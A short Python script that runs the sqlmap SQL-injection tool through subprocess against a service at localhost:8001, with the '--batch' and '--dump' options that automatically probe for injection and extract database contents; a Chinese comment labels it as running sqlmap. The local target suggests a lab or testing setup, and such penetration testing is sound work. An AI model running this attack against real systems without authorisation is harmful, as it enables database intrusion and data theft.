import subprocess

target = 'http://localhost:8001'

# 运行sqlmap
result = subprocess.run(['sqlmap', '-u', target, '--batch', '--dump'], capture_output=True, text=True)
print(result.stdout)
